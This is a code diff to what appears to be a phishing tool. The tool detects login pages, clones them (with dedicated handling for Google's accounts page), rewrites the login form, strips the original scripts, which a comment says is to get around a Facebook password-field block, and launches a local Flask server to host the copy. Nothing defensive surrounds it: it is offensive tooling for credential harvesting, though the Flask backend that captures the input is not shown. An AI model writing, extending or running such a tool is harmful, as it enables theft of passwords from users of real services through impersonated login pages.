@@ -50,6 +50,19 @@ if(mainhtml.check_form(doc, input_mail, input_pass)):
         print(colored("Page identified as Loginpage!","blue"))
         clone.download_website(url)
         screenshot.take_screenshot(url, 'screenhot.png')
+        backend.copy_files(urlparse(url).netloc, "index.html")
+        backend.implement_form()
+        inputlist =[]
+        inputnames = []
+        
+        backend.delete_scripts()
+        backend.get_vars_for_flask(inputlist, inputnames)
+        with open('data.pkl', 'wb') as f:
+            pickle.dump(inputnames, f)
+            
+        cwd = os.getcwd()
+        python_file_path =os.path.join(cwd, 'flaskapp.py')
+        subprocess.run(["python", python_file_path])
 else:  
         mainhtml.check_links(links_with_text, link_var, login_link)
         mainhtml.find_links_title(doc, link_var, login_link)
@@ -59,7 +72,19 @@ else:
             print(colored("Google Login found", "green"))
             print("url: https://accounts.google.com/")
             clone.download_website("https://accounts.google.com/")
-            screenshot.take_screenshot("https://accounts.google.com/", 'screenhot.png')
+            #screenshot.take_screenshot("https://accounts.google.com/", 'screenhot.png')
+            backend.copy_files("accounts.google.com", "index.html")
+            backend.implement_form()
+            inputlist =[]
+            inputnames = []
+            
+            backend.get_vars_for_flask(inputlist, inputnames)
+            with open('data.pkl', 'wb') as f:
+                pickle.dump(inputnames, f)
+            
+            cwd = os.getcwd()
+            python_file_path =os.path.join(cwd, 'flaskapp.py')
+            subprocess.run(["python", python_file_path])
         elif len(login_link) > 0:
             print(colored("Loginlink found!", "green"))
             mainhtml.buildurl(login_link, url)
@@ -75,11 +100,14 @@ else:
             print(colored(link,"yellow"))
             postion= int(input("which link you want to use? "))
             clone.download_website(link[postion-1])
-            screenshot.take_screenshot(link[postion-1], 'screenhot.png')
+            #screenshot.take_screenshot(link[postion-1], 'screenhot.png')
             backend.copy_files(urlparse(link[postion-1]).netloc, "index.html")
             backend.implement_form()
             inputlist =[]
             inputnames = []
+            if url == "https://facebook.com":#facebook blocks pass input field
+                backend.delete_scripts()
+            backend.delete_scripts()
             backend.get_vars_for_flask(inputlist, inputnames)
             with open('data.pkl', 'wb') as f:
                 pickle.dump(inputnames, f)
